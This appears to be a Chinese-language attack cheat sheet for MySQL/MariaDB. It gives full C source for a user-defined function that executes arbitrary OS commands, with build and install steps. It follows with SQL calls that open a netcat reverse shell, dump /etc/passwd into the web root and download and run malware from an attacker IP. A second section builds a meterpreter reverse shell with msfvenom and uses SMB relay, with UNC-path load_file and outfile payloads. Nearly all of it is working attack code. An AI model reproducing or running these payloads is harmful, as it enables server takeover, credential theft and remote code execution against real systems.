## 命令执行

### UDF

```bash
apt install libmariadb-dev
```

udf.c
```C
// 引入MySQL的头文件
#include <mysql.h>
// 引入标准输入输出的头文件
#include <stdio.h>
#include <string.h>
// 引入标准库的头文件
#include <stdlib.h>

// 定义一个外部的C函数，避免C++的名称修饰
extern "C" {
  // 定义UDF的主函数，返回一个字符串
  char *mycmd(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length, char *is_null, char *error);
  // 定义UDF的初始化函数，返回一个布尔型
  my_bool mycmd_init(UDF_INIT *initid, UDF_ARGS *args, char *message);
  // 定义UDF的结束函数，返回一个空类型
  void mycmd_deinit(UDF_INIT *initid);
}

// 实现UDF的主函数
char *mycmd(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length, char *is_null, char *error) {
  // 从args中获取一个参数，转换为字符串
  char *cmd = args->args[0];
  // 定义一个文件指针，用于存储命令的输出
  FILE *fp;
  // 定义一个字符数组，用于存储命令的结果
  char buffer[256];
  // 使用popen函数执行命令，将输出存储到fp中
  fp = popen(cmd, "r");
  // 如果fp为空，表示命令执行失败，返回NULL
  if (fp == NULL) {
    *is_null = 1;
    return NULL;
  }
  // 使用fgets函数从fp中读取一行数据，存储到buffer中
  fgets(buffer, sizeof(buffer), fp);
  // 使用pclose函数关闭fp
  pclose(fp);
  // 将buffer的内容复制到result中
  strcpy(result, buffer);
  // 获取result的长度，赋值给length
  *length = strlen(result);
  // 返回result
  return result;
}

// 实现UDF的初始化函数
my_bool mycmd_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
  // 检查参数的个数是否为1，否则报错
  if (args->arg_count != 1) {
    strcpy(message, "mycmd() requires one argument");
    return 1;
  }
  // 检查参数的类型是否为字符串，否则报错
  if (args->arg_type[0] != STRING_RESULT) {
    strcpy(message, "mycmd() requires string argument");
    return 1;
  }
  // 返回0表示成功
  return 0;
}

// 实现UDF的结束函数
void mycmd_deinit(UDF_INIT *initid) {
  // 释放initid中的内存
  free(initid->ptr);
}
```

```bash
g++ -shared -fPIC -I /usr/include/mariadb -o udf.so udf.c
sudo find / -name mysql.h
cp udf.so /usr/lib/mysql/plugin
```

```sql
CREATE FUNCTION mycmd RETURNS STRING SONAME 'udf.so';
SELECT * FROM mysql.func;

SELECT mycmd('whoami');
SELECT mycmd('cat /etc/passwd > /var/www/html/passwd.txt');
SELECT mycmd('nc -e /bin/sh 192.168.8.156 4444');
SELECT mycmd('find / -perm -u+s -type f 2>/dev/null');
SELECT mycmd('wget http://192.168.8.156/Malware-File -O /tmp/malware; chmod +x /tmp/malware;./tmp/malware');
SELECT mycmd('echo ''DROP TABLE important_data;'' >> /var/lib/mysql/数据库名/表名.sql');
```

[SQLMap UDF](https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql)

### SMB中继

[smbrelayx.py](https://github.com/fortra/impacket/blob/master/examples/smbrelayx.py)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.8.10 LPORT=443 -f exe > reverse_shell.exe
smbrelayx.py -h IP -e ./reverse_shell.exe
```

```sql
select load_file('\\\\192.168.8.10\\aa');
select load_file(0x5c5c5c5c3139322e3136382e302e3130315c5c6161);
select 'snowwolf' into dumpfile '\\\\192.168.8.10\\aa';
select 'snowwolf' into outfile '\\\\192.168.8.10\\aa';
load data infile '\\\\192.168.8.10\\aa' into table database.table_name;
```
